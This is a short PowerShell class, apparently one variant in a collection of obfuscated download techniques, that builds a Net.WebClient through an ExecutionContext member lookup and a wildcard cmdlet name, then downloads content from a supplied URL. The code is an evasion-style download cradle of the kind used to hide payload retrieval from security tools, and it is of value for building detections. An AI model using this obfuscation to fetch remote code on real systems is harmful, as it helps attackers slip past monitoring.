Class ObfDownloadFileContent5 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Cmdlet\3
        Write-Host $Execution;
        ls sl*; Write-Host (&$ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).GetCmdlets('N*-O*')Net.WebClient).DownloadString($url)
    }

}